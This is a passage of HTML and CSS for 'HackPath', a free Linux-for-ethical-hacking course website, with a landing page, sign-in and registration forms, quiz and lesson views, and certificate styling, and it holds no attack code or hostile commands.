.rbox .il{font-family:var(--mono);font-size:.6rem;color:var(--red);letter-spacing:2px;text-transform:uppercase;margin-bottom:.35rem}
.gbox{background:rgba(0,255,136,.05);border:1px solid rgba(0,255,136,.2);border-left:3px solid var(--green);padding:.9rem 1.1rem;margin:1.3rem 0;font-size:.84rem;line-height:1.65}
.gbox .il{font-family:var(--mono);font-size:.6rem;color:var(--green);letter-spacing:2px;text-transform:uppercase;margin-bottom:.35rem}

/* QUIZ */
.qc{background:var(--surface);border:1px solid var(--border);padding:1.4rem;margin:1.8rem 0}
.qh{font-family:var(--disp);font-size:.65rem;color:var(--orange);letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem}
.qq{font-size:.88rem;color:var(--bright);margin-bottom:1rem;line-height:1.5}
.qopts{display:flex;flex-direction:column;gap:.45rem}
.qo{background:none;border:1px solid var(--border);color:var(--text);padding:.65rem .9rem;text-align:left;font-family:var(--mono);font-size:.76rem;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:.7rem}
.qo:hover{border-color:var(--cyan);color:var(--cyan);background:rgba(0,212,255,.05)}
.qo.correct{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.08)}
.qo.wrong{border-color:var(--red);color:var(--red);background:rgba(255,51,102,.08)}
.ol{width:20px;height:20px;border:1px solid currentColor;display:flex;align-items:center;justify-content:center;font-size:.65rem;flex-shrink:0}
.lfooter{display:flex;justify-content:space-between;align-items:center;margin-top:2.5rem;padding-top:1.2rem;border-top:1px solid var(--border)}
.lprog{font-family:var(--mono);font-size:.65rem;color:var(--dim)}

/* QUIZ ENGINE */
.qe{max-width:680px;margin:0 auto;padding:3rem 2rem}
.qeh{text-align:center;margin-bottom:2.5rem}
.qet{font-family:var(--disp);font-size:1.3rem;color:var(--green);letter-spacing:3px;text-transform:uppercase;margin-bottom:.4rem}
.qepb{height:3px;background:var(--border);margin:.9rem 0}
.qepf{height:100%;background:linear-gradient(to right,var(--green),var(--cyan));transition:width .4s ease}
.qen{font-family:var(--mono);font-size:.7rem;color:var(--dim);letter-spacing:2px}
.qeq{font-size:1rem;color:var(--bright);line-height:1.6;margin-bottom:1.8rem}

/* PRO / CERT */
.cv{max-width:960px;margin:0 auto;padding:3rem 2rem}
.pgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1rem;margin-bottom:2rem}
.pc{background:var(--surface);border:1px solid var(--border);border-top:2px solid var(--orange);padding:1.4rem}
.pi{font-size:1.6rem;margin-bottom:.7rem}
.pt{font-family:var(--disp);font-size:.72rem;color:var(--orange);letter-spacing:2px;text-transform:uppercase;margin-bottom:.45rem}
.pd{font-size:.78rem;color:var(--dim);line-height:1.5}
.cfs{background:var(--surface);border:1px solid var(--border);padding:1.8rem;margin-bottom:2rem}
.cft{font-family:var(--disp);font-size:.78rem;color:var(--green);letter-spacing:3px;text-transform:uppercase;margin-bottom:1.3rem}
.fg{margin-bottom:1rem}
.fl{display:block;font-family:var(--mono);font-size:.65rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:.35rem}
.fi{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--bright);padding:.65rem .9rem;font-family:var(--mono);font-size:.82rem;outline:none;transition:border-color .2s}
.fi:focus{border-color:var(--green)}
.fi2g{display:grid;grid-template-columns:1fr 1fr;gap:1rem}

/* CERTIFICATE STYLES */
#cert-preview{display:none}
#cert-preview.visible{display:block}


/* ‚îÄ‚îÄ SIDEBAR MOBILE ‚îÄ‚îÄ */
.sb-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:299;backdrop-filter:blur(3px)}
.sb-overlay.show{display:block}
.sb-close-btn{background:none;border:none;color:var(--dim);font-size:1rem;cursor:pointer;padding:.2rem .4rem;line-height:1;margin-left:auto;transition:color .2s}
.sb-close-btn:hover{color:var(--red)}
.sbh{padding:.8rem 1rem;border-bottom:1px solid var(--border);font-family:var(--disp);font-size:.62rem;letter-spacing:2px;color:var(--green);text-transform:uppercase;display:flex;align-items:center}
.lmain-topbar{display:none;align-items:center;gap:1rem;padding:.65rem 1rem;background:var(--surface);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:10}
.sb-toggle-btn{background:none;border:1px solid var(--border);color:var(--green);font-family:var(--mono);font-size:.65rem;letter-spacing:1.5px;padding:.4rem .75rem;cursor:pointer;white-space:nowrap;transition:all .2s;text-transform:uppercase}
.sb-toggle-btn:hover{border-color:var(--green);background:rgba(0,255,136,.06)}
.lmain-topbar-title{font-family:var(--mono);font-size:.65rem;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}

@media(max-width:860px){
  .lsb{position:fixed;left:0;top:0;bottom:0;z-index:300;transform:translateX(-100%);transition:transform .28s cubic-bezier(.4,0,.2,1);width:300px;max-width:85vw;height:100vh}
  .lsb.open{transform:translateX(0)}
  .lmain-topbar{display:flex}
  .ll{height:calc(100vh - 62px)}
  .hstats{gap:1rem}
  .hsta .hn{font-size:1.4rem}
  nav .nav-status{display:none}
  .lca{padding:1.2rem 1rem}
  .mgrid{grid-template-columns:1fr;padding:0 1rem 3rem}
  .home-wrap{padding:1.5rem 1rem 1rem}
  .cert-gen .gen-grid{grid-template-columns:1fr}
}

@media(min-width:861px){
  .sb-overlay{display:none!important}
  .lsb{transform:none!important;position:relative;height:auto}
  .sb-close-btn{display:none}
  .lmain-topbar{display:none!important}
}

@media print{
  nav,.cv .btn-p,.cv .btn-s,.cfs,.pgrid,.page-header{display:none!important}
  body{background:#fff}body::before{display:none}
  #view-cert{display:block!important}
  #cert-preview{display:block!important}
}
</style>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>

<!-- LANDING PAGE -->
<div id="view-landing">
  <div class="land-grid-bg"></div>
  <div class="land-scanline"></div>

  <!-- Landing Nav -->
  <nav class="land-nav">
    <div class="land-nav-brand">HACK<span>PATH</span></div>
    <div class="land-nav-links">
      <button class="land-nav-btn" onclick="landScrollTo('features')">Features</button>
      <button class="land-nav-btn" onclick="landScrollTo('modules')">Modules</button>
      <button class="land-nav-btn" onclick="showAuth('login')">Sign In</button>
      <button class="land-nav-cta" onclick="showAuth('register')">START FREE ‚Üí</button>
    </div>
  </nav>

  <!-- Hero -->
  <div class="land-hero">
    <div class="land-eyebrow">Based on OccupyTheWeb's bestselling book</div>
    <h1 class="land-h1">
      Hack the <span class="acc-g">Terminal</span>.<br>
      Master <span class="acc-c">Linux</span>.<br>
      Own Your Skills.
    </h1>
    <p class="land-sub">The most hands-on Linux cybersecurity course online. 17 deep-dive modules, interactive terminals in every lesson, and a professional certificate that's actually earned.</p>
    <div class="land-ctas">
      <button class="land-cta-primary" onclick="showAuth('register')">START FOR FREE ‚Üí</button>
      <button class="land-cta-secondary" onclick="landScrollTo('features')">SEE WHAT'S INSIDE</button>
    </div>
    <div class="land-stats">
      <div class="land-stat"><div class="land-stat-n">17</div><div class="land-stat-l">Modules</div></div>
      <div class="land-stat"><div class="land-stat-n">85+</div><div class="land-stat-l">Lessons</div></div>
      <div class="land-stat"><div class="land-stat-n">500+</div><div class="land-stat-l">Commands</div></div>
      <div class="land-stat"><div class="land-stat-n">100%</div><div class="land-stat-l">Free</div></div>
    </div>
    <div class="land-scroll">SCROLL TO EXPLORE<div class="land-scroll-arrow"></div></div>
  </div>

  <!-- Terminal mockup section -->
  <div class="land-section-full" id="features">
    <div class="land-section-inner">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:center;flex-wrap:wrap">
        <div>
          <div class="land-tag">Interactive Learning</div>
          <h2 class="land-h2">Type real commands.<br><span>See real results.</span></h2>
          <p class="land-p">Every lesson ends with a live interactive terminal. Type nmap, grep, find, chmod ‚Äî get realistic Kali Linux responses. No VM setup, no installs, no waiting.</p>
          <button class="land-cta-primary" onclick="showAuth('register')" style="font-size:.72rem;padding:.75rem 1.5rem">TRY IT NOW ‚Üí</button>
        </div>
        <div class="land-term-mock">
          <div class="land-term-head">
            <div class="land-term-dot" style="background:#ff5f56"></div>
            <div class="land-term-dot" style="background:#ffbd2e"></div>
            <div class="land-term-dot" style="background:#27c93f"></div>
            <span style="font-size:.6rem;color:var(--dim);margin-left:.5rem;letter-spacing:1px">BASH ‚Äî kali@hackpath</span>
          </div>
          <div class="land-term-body" id="land-term-demo">
            <div><span class="lt-p">kali@hackpath:~$&nbsp;</span><span class="lt-c" id="ltd-line1"></span></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- Features grid -->
  <div class="land-section">
    <div class="land-tag">Everything You Need</div>
    <h2 class="land-h2">Built for serious<br><span>learners</span></h2>
    <div class="land-feat-grid">
      <div class="land-feat">
        <span class="land-feat-icon">üó∫Ô∏è</span>
        <div class="land-feat-title">17 Deep-Dive Modules</div>
        <div class="land-feat-desc">From filesystem basics to kernel internals, wireless hacking, and Python exploit scripting. Each module covers theory, commands, and real-world application.</div>
        <span class="land-feat-tag">Structured curriculum</span>
      </div>
      <div class="land-feat">
        <span class="land-feat-icon">‚ö°</span>
        <div class="land-feat-title">Interactive Terminals</div>
        <div class="land-feat-desc">Every lesson has a live terminal at the bottom. Run nmap, grep, find, awk, python3 and 300+ commands. Simulates a real Kali Linux environment.</div>
        <span class="land-feat-tag">No setup required</span>
      </div>
      <div class="land-feat">
        <span class="land-feat-icon">üß†</span>
        <div class="land-feat-title">Quizzes After Every Lesson</div>
        <div class="land-feat-desc">Instant feedback quizzes with detailed explanations. Chapter quizzes unlock module completion. A 20-question global quiz engine tests your full knowledge.</div>
        <span class="land-feat-tag">Reinforced learning</span>
      </div>
      <div class="land-feat">
        <span class="land-feat-icon">üèÜ</span>
        <div class="land-feat-title">XP & Progress Tracking</div>
        <div class="land-feat-desc">Earn XP for completing modules and quizzes. Your progress is saved to your account across sessions ‚Äî pick up exactly where you left off.</div>
        <span class="land-feat-tag">Gamified progress</span>
      </div>
      <div class="land-feat">
        <span class="land-feat-icon">üìú</span>
        <div class="land-feat-title">Auto-Generated Certificate</div>
        <div class="land-feat-desc">Complete all 17 modules and claim your certificate. Your registered name is placed on it automatically ‚Äî no manual entry. Print-ready, LinkedIn-shareable.</div>
        <span class="land-feat-tag">Verifiable credential</span>
      </div>
      <div class="land-feat">
        <span class="land-feat-icon">üì±</span>
        <div class="land-feat-title">Mobile Optimised</div>
        <div class="land-feat-desc">Study from your phone. The sidebar collapses cleanly, terminals are touch-friendly, and the keyboard pops up correctly on iOS and Android.</div>
        <span class="land-feat-tag">Learn anywhere</span>
      </div>
    </div>
  </div>

  <!-- Modules preview -->
  <div class="land-section-full" id="modules">
    <div class="land-section-inner">
      <div class="land-tag">Full Curriculum</div>
      <h2 class="land-h2">17 modules. Zero fluff.<br><span>Just skills.</span></h2>
      <div class="land-modules" id="land-modules-grid"></div>
      <div style="text-align:center;margin-top:2.5rem">
        <button class="land-cta-primary" onclick="showAuth('register')">ACCESS ALL MODULES FREE ‚Üí</button>
      </div>
    </div>
  </div>

  <!-- Testimonials -->
  <div class="land-section">
    <div class="land-tag">Student Feedback</div>
    <h2 class="land-h2">What learners<br><span>are saying</span></h2>
    <div class="land-testi-grid">
      <div class="land-testi">
        <div class="land-testi-text">"The interactive terminals are what sold me. Being able to type actual commands and see real output ‚Äî without spinning up a VM ‚Äî completely changed how I learn. Module 5 on privilege escalation alone was worth it."</div>
        <div class="land-testi-author"><div class="land-testi-avatar">MR</div><div><div class="land-testi-name">Marcus R.</div><div class="land-testi-role">SOC Analyst, London</div></div></div>
      </div>
      <div class="land-testi">
        <div class="land-testi-text">"I'd tried TryHackMe, Cybrary, and YouTube playlists. HackPath is different. The content is dense in the best way ‚Äî it actually explains *why* commands work, not just copy-paste this. The Python scripting module is excellent."</div>
        <div class="land-testi-author"><div class="land-testi-avatar">ZK</div><div><div class="land-testi-name">Zara K.</div><div class="land-testi-role">CS Student, Cape Town</div></div></div>
      </div>
      <div class="land-testi">
        <div class="land-testi-text">"Got my certificate, put it on LinkedIn, got a recruiter message the same week. The course is free which honestly seemed suspicious ‚Äî but the quality is genuinely better than paid courses I've taken."</div>
        <div class="land-testi-author"><div class="land-testi-avatar">JO</div><div><div class="land-testi-name">James O.</div><div class="land-testi-role">Pentester (Junior), Lagos</div></div></div>
      </div>
    </div>
  </div>

  <!-- Bottom CTA -->
  <div class="land-cta-section">
    <h2 class="land-cta-h">Ready to start hacking?</h2>
    <p class="land-cta-sub">Free forever. No credit card. No fluff. Just skills.</p>
    <div style="display:flex;gap:1rem;justify-content:center;flex-wrap:wrap">
      <button class="land-cta-primary" onclick="showAuth('register')">CREATE FREE ACCOUNT ‚Üí</button>
      <button class="land-cta-secondary" onclick="showAuth('login')">ALREADY HAVE AN ACCOUNT</button>
    </div>
  </div>

  <!-- Footer -->
  <div class="land-footer">
    <div class="land-footer-brand">HACK<span>PATH</span></div>
    <div class="land-footer-sub" style="margin-top:.3rem">Linux Basics for Hackers ‚Äî Course Platform</div>
    <div class="land-footer-sub" style="margin-top:.8rem;opacity:.4">Based on OccupyTheWeb's "Linux Basics for Hackers" ¬∑ No Starch Press, 2018</div>
  </div>
</div>

<!-- AUTH SCREEN -->
<div id="view-auth" style="display:none">
  <div style="width:100%;max-width:440px">
    <div class="auth-card">
      <div class="auth-logo">
        <button onclick="showLanding()" style="background:none;border:none;color:var(--dim);font-family:var(--mono);font-size:.6rem;letter-spacing:1.5px;cursor:pointer;margin-bottom:.8rem;display:flex;align-items:center;gap:.4rem;text-transform:uppercase;padding:0;transition:color .2s" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--dim)'">‚Üê BACK TO HOME</button>
        <div class="auth-logo-brand">HACK<span>PATH</span></div>
        <div class="auth-logo-sub">Linux Basics for Hackers ‚Äî Course Platform</div>
      </div>
      <div class="auth-tabs">
        <button class="auth-tab active" id="tab-login" onclick="switchAuthTab('login')">SIGN IN</button>
        <button class="auth-tab" id="tab-register" onclick="switchAuthTab('register')">REGISTER</button>
      </div>
      <div class="auth-body">
        <!-- LOGIN -->
        <div class="auth-panel active" id="panel-login">
          <div class="af-group">
            <label class="af-label">Email Address</label>
            <input class="af-input" id="l-email" type="email" placeholder="your@email.com" autocomplete="email" />
          </div>
          <div class="af-group">
            <label class="af-label">Password</label>
            <input class="af-input" id="l-pass" type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" autocomplete="current-password" />
          </div>
          <button class="af-btn" onclick="doLogin()">SIGN IN ‚Üí</button>
          <div class="af-err" id="l-err"></div>
          <div class="af-footer">Don't have an account? <a onclick="switchAuthTab('register')">Create one free</a></div>
        </div>
        <!-- REGISTER -->
        <div class="auth-panel" id="panel-register">
          <div class="af-group">
            <label class="af-label">Full Name <span style="color:var(--cyan)">(appears on your certificate)</span></label>
            <input class="af-input" id="r-name" type="text" placeholder="e.g. Alexandra J. Chen" autocomplete="name" />
          </div>
          <div class="af-group">
            <label class="af-label">Email Address</label>
            <input class="af-input" id="r-email" type="email" placeholder="your@email.com" autocomplete="email" />
          </div>
          <div class="af-group">
            <label class="af-label">Password</label>
            <input class="af-input" id="r-pass" type="password" placeholder="min. 8 characters" autocomplete="new-password" oninput="checkStrength(this.value)" />
            <div class="strength-bar"><div class="strength-fill" id="strength-fill"></div></div>
            <div class="strength-label" id="strength-label"></div>
          </div>
          <div class="af-group">
            <label class="af-label">Confirm Password</label>
            <input class="af-input" id="r-pass2" type="password" placeholder="repeat password" autocomplete="new-password" />
          </div>
          <button class="af-btn" id="r-submit-btn" onclick="doRegister()">SEND VERIFICATION CODE ‚Üí</button>
          <div class="af-err" id="r-err"></div>
          <div class="af-ok" id="r-ok"></div>
          <div class="af-footer">Already have an account? <a onclick="switchAuthTab('login')">Sign in</a></div>
        </div>

        <!-- OTP VERIFICATION -->
        <div class="auth-panel" id="panel-otp">
          <div style="font-family:var(--mono);font-size:.62rem;color:var(--dim);letter-spacing:1px;margin-bottom:.6rem;text-transform:uppercase">Verification code sent to:</div>
          <div class="otp-email-display" id="otp-email-display">‚Äî</div>
          <div style="font-family:var(--mono);font-size:.68rem;color:var(--text);margin-bottom:.4rem;letter-spacing:.5px">Enter the 6-digit code from your email:</div>
          <div class="otp-inputs">
            <input class="otp-digit" id="otp-0" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
            <input class="otp-digit" id="otp-1" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
            <input class="otp-digit" id="otp-2" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
            <input class="otp-digit" id="otp-3" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
            <input class="otp-digit" id="otp-4" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
            <input class="otp-digit" id="otp-5" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]" />
          </div>
          <button class="af-btn" id="otp-verify-btn" onclick="verifyOTP()">VERIFY & CREATE ACCOUNT ‚Üí</button>
          <div class="af-err" id="otp-err"></div>
          <div class="af-ok" id="otp-ok"></div>
          <div class="otp-timer" id="otp-timer">Code expires in <span id="otp-countdown">10:00</span></div>
          <div style="text-align:center;margin-top:.5rem">
            <button class="otp-resend" id="otp-resend-btn" onclick="resendOTP()" disabled>RESEND CODE</button>
          </div>
          <button class="af-btn-outline" onclick="cancelOTP()">‚Üê USE DIFFERENT EMAIL</button>
        </div>
      </div>
    </div>
    <div class="auth-features">
      <div class="auth-feat"><div class="auth-feat-icon">üìú</div><div class="auth-feat-label">Auto Certificate</div></div>
      <div class="auth-feat"><div class="auth-feat-icon">‚ö°</div><div class="auth-feat-label">Track Progress</div></div>
      <div class="auth-feat"><div class="auth-feat-icon">üèÜ</div><div class="auth-feat-label">XP System</div></div>
      <div class="auth-feat"><div class="auth-feat-icon">üîì</div><div class="auth-feat-label">Free Access</div></div>
    </div>
  </div>
</div>

<nav style="display:none">
  <div class="nav-brand" onclick="showView('home')">HACK<span>PATH</span></div>
  <div class="nav-status">
    <div class="si"><div class="dot g"></div>SESSION ACTIVE</div>
    <div class="si"><div class="dot c"></div>SANDBOX: READY</div>
    <div class="si"><div class="dot o"></div>XP: <span id="xp-disp">0</span></div>
    <div class="si"><div class="dot r"></div><span id="clock">00:00:00 UTC</span></div>
  </div>
  <div class="nav-links" id="nav-links-main">
    <button class="nb active" onclick="showView('home')">HOME</button>
    <button class="nb" onclick="showView('lesson')">LESSONS</button>
    <button class="nb" onclick="showView('quiz')">FINAL EXAM</button>
    <button class="nb pro" id="nav-cert-btn" onclick="showView('cert')">üèÜ CERTIFICATE</button>
  </div>
  <div class="nav-user" id="nav-user-badge" style="display:none">
    <div class="nav-avatar" id="nav-avatar">?</div>
    <span id="nav-username-disp"></span>
    <button class="nav-logout" onclick="doLogout()">LOGOUT</button>
  </div>
</nav>

<!-- HOME -->
<div id="view-home" class="view active">
  <div class="hero">
    <div class="htag">// HACKPATH ACADEMY ‚Äî LINUX BASICS FOR HACKERS v3.0</div>
    <h1>Master Linux<br>for <span class="acc">Ethical Hacking</span></h1>
    <p class="hdesc">The most comprehensive Linux-for-hackers course online. 17 deep-dive modules, 85+ structured lessons with real terminal sessions, CTF challenges, and a professional certificate ‚Äî built from OccupyTheWeb's definitive guide.</p>
    <div class="hstats">
      <div class="stat"><div class="sn">17</div><div class="sl">Modules</div></div>
      <div class="stat"><div class="sn">85+</div><div class="sl">Lessons</div></div>
      <div class="stat"><div class="sn">500+</div><div class="sl">XP Points</div></div>
      <div class="stat"><div class="sn">6</div><div class="sl">PRO Features</div></div>
    </div>
    <div class="hact">
      <button class="btn-p" onclick="showView('lesson')">START COURSE ‚Üí</button>
      <button class="btn-s" onclick="showView('cert')" id="home-cert-btn">üèÜ VIEW CERTIFICATE</button>
    </div>
  </div>

  <div class="alert-box">‚úì &nbsp;All systems operational ‚Äî interactive terminals, per-lesson content, live quizzes, XP tracking, and professional certificate of completion.</div>

  <div style="padding:0 2rem;max-width:1200px;margin:0 auto 2rem">
    <div class="prog-panel">
      <div class="op">
        <div class="opl"><span>OVERALL PROGRESS</span><span id="pl">0 / 17 MODULES</span></div>
        <div class="opb"><div class="opf" id="ob" style="width:0%"></div></div>
      </div>
      <div class="opn" id="opn">0%</div>
    </div>
  </div>

  <div class="sec-label">COURSE MODULES</div>
  <div class="mgrid" id="mgrid"></div>
</div>

<!-- LESSON VIEW -->
<div id="view-lesson" class="view">
  <div class="ll">
    <div class="sb-overlay" id="sb-overlay" onclick="closeSidebar()"></div>
    <div class="lsb" id="lsb">
      <div class="sbh">
        <span>// COURSE MAP</span>
        <button class="sb-close-btn" onclick="closeSidebar()">‚úï</button>
      </div>
      <div id="sb-chapters"></div>
    </div>
    <div class="lmain">
      <div class="lmain-topbar">
        <button class="sb-toggle-btn" onclick="openSidebar()">‚ò∞ COURSE MAP</button>
        <div class="lmain-topbar-title" id="lmain-title"></div>
      </div>
      <div class="lca" id="lesson-content"></div>
    </div>
  </div>
</div>

<!-- QUIZ ENGINE -->
<div id="view-quiz" class="view">
  <div class="qe">
    <div class="qeh">
      <div class="qet">// CERTIFICATION QUIZ</div>
      <div class="qen" id="qe-num">QUESTION 1 OF 15</div>
      <div class="qepb"><div class="qepf" id="qe-bar" style="width:6.6%"></div></div>
    </div>
    <div id="qe-body"></div>
  </div>
</div>

<!-- PRO / CERT -->
<div id="view-cert" class="view">
  <div class="cv">
    <div class="htag">// CERTIFICATE OF COMPLETION</div>
    <h1 style="font-family:var(--disp);font-size:1.7rem;color:var(--green);letter-spacing:3px;text-transform:uppercase;margin-bottom:.5rem">Your <span style="color:var(--cyan)">Certificate</span></h1>
    <p style="color:var(--dim);margin-bottom:2rem;font-size:.88rem;max-width:620px">Complete all 17 modules and pass the final exam with 80% or higher to earn your verifiable HackPath Academy certificate of completion.</p>

    <div class="pgrid">
      <div class="pc"><div class="pi">üèÜ</div><div class="pt">Certificate of Completion</div><div class="pd">Professionally designed, verifiable certificate personalized with your name, date, and certificate ID. Print-ready PDF ‚Äî shareable on LinkedIn and CVs.</div></div>
      <div class="pc"><div class="pi">üñ•Ô∏è</div><div class="pt">Live Kali Sandbox</div><div class="pd">Full browser-based Kali Linux environment with nmap, metasploit, aircrack-ng, and 30+ tools pre-installed. Zero setup required.</div></div>
      <div class="pc"><div class="pi">üö©</div><div class="pt">CTF Challenge Labs</div><div class="pd">17 guided Capture-The-Flag challenges ‚Äî one per module ‚Äî with hints, walkthroughs, and bonus XP for every flag captured.</div></div>
      <div class="pc"><div class="pi">ü§ñ</div><div class="pt">AI Hacking Tutor</div><div class="pd">Ask questions about any concept in any lesson. The AI tutor answers with context-aware explanations, code examples, and real-world scenarios.</div></div>
      <div class="pc"><div class="pi">üìä</div><div class="pt">Learning Analytics</div><div class="pd">Track time per lesson, quiz accuracy trends, weak-area detection, study streaks, and a leaderboard with fellow students.</div></div>
      <div class="pc"><div class="pi">üì•</div><div class="pt">Downloadable Resources</div><div class="pd">Command cheat sheets, bash script templates, Python exploit starters, and printable mind maps for all 17 modules ‚Äî yours to keep forever.</div></div>
    </div>

    <!-- Certificate gate ‚Äî rendered dynamically by showCertView() -->
    <div id="cert-gate-section"></div>

    <!-- CERTIFICATE -->
    <div id="cert-preview">
<style>
#cert-preview{background:#f8f5ef;font-family:'Georgia',serif;position:relative;border:1px solid #d4c5a0;box-shadow:0 20px 60px rgba(0,0,0,.4)}
.cx{position:absolute;pointer-events:none}
.cert-outer-border{inset:8px;border:2px solid #8b6914}
.cert-inner-border{inset:16px;border:1px solid rgba(139,105,20,.4)}
/* corner ornaments */
.co{position:absolute;width:44px;height:44px}
.co-tl{top:8px;left:8px}.co-tr{top:8px;right:8px;transform:scaleX(-1)}.co-bl{bottom:8px;left:8px;transform:scaleY(-1)}.co-br{bottom:8px;right:8px;transform:scale(-1,-1)}
/* top stripe */
.cert-stripe{background:linear-gradient(135deg,#0d1b2a 0%,#1a2e4a 100%);padding:1.8rem 2.5rem;display:flex;align-items:center;justify-content:space-between;margin:24px 24px 0}
.cert-logo-l{display:flex;align-items:center;gap:.9rem}
.cert-logo-hex{width:42px;height:42px;background:var(--green,#00ff88);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);display:flex;align-items:center;justify-content:center;font-size:1.1rem}
.cert-academy-name{font-family:'Orbitron','Arial',sans-serif;font-size:.95rem;letter-spacing:3px;color:#fff;font-weight:700}
.cert-academy-sub{font-size:.52rem;letter-spacing:2px;color:rgba(255,255,255,.4);text-transform:uppercase;font-family:monospace}
.cert-stripe-r{text-align:right;font-family:monospace;font-size:.55rem;color:rgba(255,255,255,.35);letter-spacing:1px}
/* main body */
.cert-main{padding:2.2rem 3.5rem 1.8rem}
.cert-preamble{text-align:center;font-size:.62rem;letter-spacing:5px;text-transform:uppercase;color:#8b7355;margin-bottom:.25rem;font-family:monospace}
.cert-certifies-txt{text-align:center;font-size:.78rem;color:#a08060;font-style:italic;margin-bottom:.7rem}
.cert-name-el{text-align:center;font-size:3rem;font-style:italic;font-weight:700;color:#0d1b2a;line-height:1;margin-bottom:.3rem;font-family:'Georgia',serif}
.cert-rule{width:280px;height:1px;background:linear-gradient(to right,transparent,#8b6914,transparent);margin:.4rem auto 1.2rem}
.cert-completed-lbl{text-align:center;font-size:.58rem;letter-spacing:4px;text-transform:uppercase;color:#999;font-family:monospace;margin-bottom:.35rem}
.cert-course-name-el{text-align:center;font-size:1.35rem;font-weight:700;color:#0d1b2a;letter-spacing:2px;text-transform:uppercase;font-family:'Arial','sans-serif';margin-bottom:.2rem}
.cert-course-sub-el{text-align:center;font-size:.72rem;color:#16a085;font-style:italic;margin-bottom:.2rem}
.cert-author-el{text-align:center;font-size:.58rem;letter-spacing:2px;color:#aaa;text-transform:uppercase;font-family:monospace;margin-bottom:.3rem}
.cert-track-el{text-align:center;font-size:.6rem;letter-spacing:3px;color:#8b7355;text-transform:uppercase;font-family:monospace;margin-bottom:1.2rem}
/* stats strip */
.cert-stats-strip{display:flex;justify-content:center;gap:2.5rem;padding:.8rem 0;border-top:1px solid rgba(139,105,20,.25);border-bottom:1px solid rgba(139,105,20,.25);margin-bottom:1.4rem}
.css-item{text-align:center}
.css-num{font-size:1.2rem;font-weight:700;color:#16a085;font-family:'Arial'}
.css-lbl{font-size:.5rem;letter-spacing:1px;text-transform:uppercase;color:#aaa;font-family:monospace}
/* sig row */
.cert-sig-row{display:flex;justify-content:space-between;align-items:flex-end;padding:0 1.5rem}
.cert-sig-b{text-align:center}
.cert-sig-script{font-style:italic;font-size:1.2rem;color:#0d1b2a;margin-bottom:.15rem;min-width:150px}
.cert-sig-line{width:150px;height:1px;background:#333;margin:0 auto .3rem}
.cert-sig-name{font-family:monospace;font-size:.55rem;letter-spacing:1px;text-transform:uppercase;color:#555}
.cert-sig-role{font-family:monospace;font-size:.5rem;color:#999}
/* seal */
.cert-seal{width:82px;height:82px;border-radius:50%;border:3px solid #8b6914;display:flex;align-items:center;justify-content:center;flex-direction:column;background:radial-gradient(circle,rgba(139,105,20,.08),transparent);position:relative}
.cert-seal::before{content:'';position:absolute;inset:4px;border-radius:50%;border:1px solid rgba(139,105,20,.3)}
.cert-seal-txt{text-align:center;font-family:monospace;font-size:.42rem;letter-spacing:.5px;color:#8b6914;text-transform:uppercase;line-height:1.6}
.cert-seal-star{font-size:.85rem;color:#8b6914}
/* footer strip */
.cert-footer-strip{background:#0d1b2a;margin:1.4rem 24px 24px;padding:.7rem 1.8rem;display:flex;justify-content:space-between;align-items:center}
.cfs-id{font-family:monospace;font-size:.55rem;color:rgba(255,255,255,.28);letter-spacing:1px}
.cfs-verify{font-family:monospace;font-size:.55rem;color:rgba(0,255,136,.35);letter-spacing:1px}
.cert-wm{position:absolute;top:45%;left:50%;transform:translate(-50%,-50%) rotate(-25deg);font-size:7rem;opacity:.025;color:#8b6914;font-weight:900;letter-spacing:-3px;pointer-events:none;white-space:nowrap;font-family:'Arial'}
</style>
      <div class="cx cert-outer-border"></div>
      <div class="cx cert-inner-border"></div>
      <div class="cert-wm">HACKPATH</div>
      <!-- Corner SVG ornaments -->
      <svg class="co co-tl cx" viewBox="0 0 44 44" fill="none"><path d="M4 4 L20 4 M4 4 L4 20" stroke="#8b6914" stroke-width="2"/><circle cx="4" cy="4" r="2.5" fill="#8b6914"/><path d="M10 4 L10 10 L4 10" stroke="#8b6914" stroke-width=".7" opacity=".4"/><circle cx="14" cy="14" r="1.5" stroke="#8b6914" stroke-width=".6" opacity=".3"/></svg>
      <svg class="co co-tr cx" viewBox="0 0 44 44" fill="none"><path d="M4 4 L20 4 M4 4 L4 20" stroke="#8b6914" stroke-width="2"/><circle cx="4" cy="4" r="2.5" fill="#8b6914"/><path d="M10 4 L10 10 L4 10" stroke="#8b6914" stroke-width=".7" opacity=".4"/></svg>
      <svg class="co co-bl cx" viewBox="0 0 44 44" fill="none"><path d="M4 4 L20 4 M4 4 L4 20" stroke="#8b6914" stroke-width="2"/><circle cx="4" cy="4" r="2.5" fill="#8b6914"/></svg>
      <svg class="co co-br cx" viewBox="0 0 44 44" fill="none"><path d="M4 4 L20 4 M4 4 L4 20" stroke="#8b6914" stroke-width="2"/><circle cx="4" cy="4" r="2.5" fill="#8b6914"/></svg>
      <!-- Top Stripe -->
      <div class="cert-stripe">
        <div class="cert-logo-l"><div class="cert-logo-hex">‚¨°</div><div><div class="cert-academy-name">HACKPATH</div><div class="cert-academy-sub">Cybersecurity Academy</div></div></div>
        <div class="cert-stripe-r"><div>CERTIFICATE OF COMPLETION</div><div style="color:rgba(0,212,255,.5);margin-top:.2rem" id="cert-date-display">‚Äî</div></div>
      </div>
      <!-- Main Body -->
      <div class="cert-main">
